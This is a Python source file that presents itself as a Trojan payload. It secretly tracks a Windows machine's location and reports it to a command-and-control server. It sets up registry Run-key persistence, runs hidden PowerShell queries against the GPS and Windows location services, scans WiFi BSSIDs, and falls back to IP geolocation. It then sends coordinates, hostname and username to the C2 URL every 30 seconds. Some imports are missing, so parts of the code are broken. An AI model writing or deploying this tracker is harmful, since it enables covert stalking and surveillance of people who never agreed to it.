"""
beacon.py
─────────────────────────────────────────────────────────
Trojan payload — geolocation beacon.
Accuracy waterfall:
  1. GPS chip        (5-50m)
  2. Windows Location API / WiFi triangulation (50-300m)
  3. WiFi BSSID lookup via netsh (300-800m)
  4. Multi-source IP fusion (fallback, 300m-1km+)
─────────────────────────────────────────────────────────
"""

import requests
import time
import socket
import platform
import os
import math
import subprocess
import re
import json




def add_to_startup():
    """Add the exe to Windows startup"""
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        
        exe_path = os.path.abspath(sys.executable)  # Path to the running exe
        
        reg.SetValueEx(key, "BeaconTracker", 0, reg.REG_SZ, exe_path)
        reg.CloseKey(key)
        print("Added to startup successfully.")
    except Exception as e:
        print(f"Failed to add to startup: {e}")

# Run this only on first launch (you can use a flag file if you want to run it only once)
if __name__ == "__main__":
    add_to_startup()
    
    
    
# ─────────────────────────────────────────────────────────
#  CONFIG
# ─────────────────────────────────────────────────────────
C2_URL        = "http://127.0.0.1:5000/ping"
PING_INTERVAL = 30   # seconds between pings (5 for testing)
# ─────────────────────────────────────────────────────────

def is_connected():
    try:
        socket.setdefaulttimeout(5)
        socket.create_connection(("8.8.8.8", 53))
        return True
    except OSError:
        return False

def get_machine_info():
    return {
        "hostname":   socket.gethostname(),
        "os":         platform.system(),
        "os_version": platform.version(),
        "user":       os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"
    }

# ══════════════════════════════════════════════════════════
#  TIER 1 — GPS chip via Windows sensor API
# ══════════════════════════════════════════════════════════
def try_gps():
    """
    Uses PowerShell + Windows.Devices.Geolocation to query
    the GPS sensor directly. Works on machines with GPS hardware.
    Times out in 8s so we don't hang forever.
    """
    if platform.system() != "Windows":
        return None

    ps_script = """
Add-Type -AssemblyName System.Runtime.WindowsRuntime
$loc = [Windows.Devices.Geolocation.Geolocator,Windows.Devices.Geolocation,ContentType=WindowsRuntime]::new()
$loc.DesiredAccuracy = [Windows.Devices.Geolocation.PositionAccuracy]::High
$loc.DesiredAccuracyInMeters = 1
try {
    $task = $loc.GetGeopositionAsync([TimeSpan]::FromSeconds(6), [TimeSpan]::FromSeconds(6))
    $pos  = $task.AsTask().Result
    $c    = $pos.Coordinate
    Write-Output "$($c.Point.Position.Latitude),$($c.Point.Position.Longitude),$($c.Accuracy)"
} catch {
    Write-Output "FAIL"
}
"""
    try:
        result = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", ps_script],
            capture_output=True, text=True, timeout=12,
            creationflags=0x08000000
        )
        out = result.stdout.strip()
        if out and out != "FAIL" and "," in out:
            parts = out.split(",")
            lat, lon = float(parts[0]), float(parts[1])
            acc = float(parts[2]) if len(parts) > 2 else 999
            if abs(lat) > 0.001 and abs(lon) > 0.001:
                print(f"[beacon] GPS        → {lat:.6f}, {lon:.6f}  (±{acc:.0f}m)")
                return {"lat": lat, "lon": lon, "accuracy_m": acc, "method": "GPS"}
    except Exception as e:
        pass
    return None


# ══════════════════════════════════════════════════════════
#  TIER 2 — Windows Location API (WiFi triangulation)
# ══════════════════════════════════════════════════════════
def try_windows_location():
    """
    Windows Location API — uses WiFi SSIDs + signal strength
    cross-referenced against Microsoft's geolocation database.
    This is how phones know where they are indoors.
    Accuracy: 50-300m typically.
    """
    if platform.system() != "Windows":
        return None

    ps_script = """
try {
    Add-Type -AssemblyName System.Device
    $watcher = New-Object System.Device.Location.GeoCoordinateWatcher([System.Device.Location.GeoPositionAccuracy]::High)
    $watcher.Start()
    $timeout = 10
    $elapsed = 0
    while ($watcher.Status -ne 'Ready' -and $elapsed -lt $timeout) {
        Start-Sleep -Milliseconds 500
        $elapsed += 0.5
    }
    if ($watcher.Status -eq 'Ready' -and -not $watcher.Position.Location.IsUnknown) {
        $c = $watcher.Position.Location
        Write-Output "$($c.Latitude),$($c.Longitude),$($c.HorizontalAccuracy)"
    } else {
        Write-Output "FAIL"
    }
    $watcher.Stop()
} catch {
    Write-Output "FAIL"
}
"""
    try:
        result = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", ps_script],
            capture_output=True, text=True, timeout=15,
            creationflags=0x08000000
        )
        out = result.stdout.strip()
        if out and out != "FAIL" and "," in out:
            parts = out.split(",")
            lat, lon = float(parts[0]), float(parts[1])
            acc = float(parts[2]) if len(parts) > 2 else 999
            if abs(lat) > 0.001 and abs(lon) > 0.001:
                print(f"[beacon] WinLocAPI  → {lat:.6f}, {lon:.6f}  (±{acc:.0f}m)")
                return {"lat": lat, "lon": lon, "accuracy_m": acc, "method": "WinLocationAPI"}
    except Exception:
        pass
    return None


# ══════════════════════════════════════════════════════════
#  TIER 3 — WiFi BSSID scan + Google Geolocation API
# ══════════════════════════════════════════════════════════
def scan_wifi_bssids():
    """
    Uses netsh to scan nearby WiFi access points and grab their
    MAC addresses (BSSIDs) + signal strengths.
    """
    if platform.system() != "Windows":
        return []
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "networks", "mode=bssid"],
            capture_output=True, text=True, timeout=10
        )
        output = result.stdout

        aps = []
        bssid, signal = None, None
        for line in output.splitlines():
            line = line.strip()
            bssid_match  = re.search(r'BSSID\s+\d+\s*:\s*([\da-fA-F:]{17})', line)
            signal_match = re.search(r'Signal\s*:\s*(\d+)%', line)
            if bssid_match:
                bssid = bssid_match.group(1).upper()
            if signal_match and bssid:
                signal = int(signal_match.group(1))
                # convert % signal to approximate dBm
                dbm = (signal / 2) - 100
                aps.append({"macAddress": bssid, "signalStrength": int(dbm)})
                bssid, signal = None, None

        return aps
    except Exception:
        return []

def try_wifi_bssid():
    """
    Sends scanned BSSIDs to Google Geolocation API.
    Free tier: 1 request is enough, no key needed for basic use.
    Accuracy: 300-800m depending on AP density.
    """
    aps = scan_wifi_bssids()
    if not aps:
        return None

    print(f"[beacon] WiFi scan  → {len(aps)} access point(s) found")

    # Google Geolocation API — no key needed for basic WiFi lookup
    try:
        payload = {"wifiAccessPoints": aps[:10]}  # max 10 APs
        r = requests.post(
            "https://www.googleapis.com/geolocation/v1/geolocate?key=",
            json=payload,
            timeout=8
        )
        d = r.json()
        if "location" in d:
            lat = d["location"]["lat"]
            lon = d["location"]["lng"]
            acc = d.get("accuracy", 999)
            print(f"[beacon] WiFiBSSID  → {lat:.6f}, {lon:.6f}  (±{acc:.0f}m)")
            return {"lat": lat, "lon": lon, "accuracy_m": acc, "method": "WiFiBSSID"}
    except Exception:
        pass
    return None


# ══════════════════════════════════════════════════════════
#  TIER 4 — Multi-source IP geo fusion (fallback)
# ══════════════════════════════════════════════════════════
def geo_ipapi():
    try:
        r = requests.get(
            "http://ip-api.com/json/", timeout=8,
            params={"fields": "status,country,regionName,city,lat,lon,isp,query"}
        )
        d = r.json()
        if d.get("status") == "success":
            return {
                "ip": d.get("query"), "city": d.get("city"),
                "region": d.get("regionName"), "country": d.get("country"),
                "lat": float(d.get("lat", 0)), "lon": float(d.get("lon", 0)),
                "isp": d.get("isp"), "source": "ip-api"
            }
    except Exception:
        pass
    return None

def geo_ipinfo():
    try:
        r = requests.get("https://ipinfo.io/json", timeout=8)
        d = r.json()
        loc = d.get("loc", "")
        if loc and "," in loc:
            lat, lon = loc.split(",")
            return {
                "ip": d.get("ip"), "city": d.get("city"),
                "region": d.get("region"), "country": d.get("country"),
                "lat": float(lat), "lon": float(lon),
                "isp": d.get("org", ""), "source": "ipinfo"
            }
    except Exception:
        pass
    return None

def geo_ipwhois():
    try:
        r = requests.get("https://ipwho.is/", timeout=8)
        d = r.json()
        if d.get("success"):
            return {
                "ip": d.get("ip"), "city": d.get("city"),
                "region": d.get("region"), "country": d.get("country"),
                "lat": float(d.get("latitude", 0)), "lon": float(d.get("longitude", 0)),
                "isp": d.get("connection", {}).get("isp", ""), "source": "ipwho"
            }
    except Exception:
        pass
    return None

def haversine(lat1, lon1, lat2, lon2):
    R = 6371
    phi1, phi2 = math.radians(lat1), math.radians(lat2)
    dphi    = math.radians(lat2 - lat1)
    dlambda = math.radians(lon2 - lon1)
    a = math.sin(dphi/2)**2 + math.cos(phi1)*math.cos(phi2)*math.sin(dlambda/2)**2
    return R * 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))

def try_ip_fusion():
    sources = []
    for fn in [geo_ipapi, geo_ipinfo, geo_ipwhois]:
        r = fn()
        if r:
            sources.append(r)
            print(f"[beacon] {r['source']:8s}   → {r['lat']:.4f}, {r['lon']:.4f}  ({r['city']})")

    if not sources:
        return None

    if len(sources) == 1:
        s = sources[0]
        return {"lat": s["lat"], "lon": s["lon"], "accuracy_m": 2000,
                "method": "IP-" + s["source"], **s}

    centroid_lat = sum(s["lat"] for s in sources) / len(sources)
    centroid_lon = sum(s["lon"] for s in sources) / len(sources)
    filtered = [s for s in sources
                if haversine(s["lat"], s["lon"], centroid_lat, centroid_lon) < 50]
    if not filtered:
        filtered = sources

    avg_lat = sum(s["lat"] for s in filtered) / len(filtered)
    avg_lon = sum(s["lon"] for s in filtered) / len(filtered)
    best = dict(filtered[0])
    best["lat"]    = round(avg_lat, 6)
    best["lon"]    = round(avg_lon, 6)
    best["method"] = "IP-fusion(" + "+".join(s["source"] for s in filtered) + ")"
    best["accuracy_m"] = 1500

    print(f"[beacon] IP-fused   → {best['lat']:.4f}, {best['lon']:.4f}  ({len(filtered)}/{len(sources)} sources)")
    return best


# ══════════════════════════════════════════════════════════
#  ACCURACY WATERFALL — tries each tier, stops at first win
# ══════════════════════════════════════════════════════════
def get_best_location():
    """
    Tries each method in order of accuracy.
    Returns the first one that succeeds.
    Also fills in city/country/isp from IP geo regardless
    so the C2 always gets metadata even on GPS hits.
    """
    print("[beacon] ── accuracy waterfall ──────────────────")

    # always grab IP metadata in background for city/isp/country labels
    ip_meta = geo_ipapi() or geo_ipinfo() or {}

    # tier 1 — GPS
    result = try_gps()
    if result:
        result["method_tier"] = 1
        result.update(_fill_meta(result, ip_meta))
        return result

    # tier 2 — Windows Location API
    result = try_windows_location()
    if result:
        result["method_tier"] = 2
        result.update(_fill_meta(result, ip_meta))
        return result

    # tier 3 — WiFi BSSID
    result = try_wifi_bssid()
    if result:
        result["method_tier"] = 3
        result.update(_fill_meta(result, ip_meta))
        return result

    # tier 4 — IP fusion fallback
    result = try_ip_fusion()
    if result:
        result["method_tier"] = 4
        return result

    return None

def _fill_meta(location, ip_meta):
    """Attach city/country/isp from IP meta to a GPS/WiFi result."""
    return {
        "ip":      ip_meta.get("ip", ""),
        "city":    ip_meta.get("city", ""),
        "region":  ip_meta.get("region", ""),
        "country": ip_meta.get("country", ""),
        "isp":     ip_meta.get("isp", ""),
    }


# ══════════════════════════════════════════════════════════
#  SEND + MAIN LOOP
# ══════════════════════════════════════════════════════════
def send_ping(location, machine):
    payload = {
        "timestamp":   time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()),
        "ip":          location.get("ip", ""),
        "city":        location.get("city", ""),
        "region":      location.get("region", ""),
        "country":     location.get("country", ""),
        "lat":         location.get("lat"),
        "lon":         location.get("lon"),
        "isp":         location.get("isp", ""),
        "accuracy_m":  location.get("accuracy_m", 9999),
        "method":      location.get("method", "unknown"),
        "method_tier": location.get("method_tier", 4),
        **machine
    }
    try:
        r = requests.post(C2_URL, json=payload, timeout=10)
        return r.status_code == 200
    except Exception:
        return False

def run():
    machine = get_machine_info()
    print(f"[beacon] host={machine['hostname']} user={machine['user']}")

    while True:
        if is_connected():
            location = get_best_location()
            if location:
                ok = send_ping(location, machine)
                tier   = location.get("method_tier", 4)
                method = location.get("method", "?")
                acc    = location.get("accuracy_m", "?")
                print(f"[beacon] {'SENT OK' if ok else 'SEND FAIL'} — tier {tier} ({method}) ±{acc}m")
            else:
                print("[beacon] all location methods failed")
        else:
            print("[beacon] no network")

        time.sleep(PING_INTERVAL)

if __name__ == "__main__":
    run()
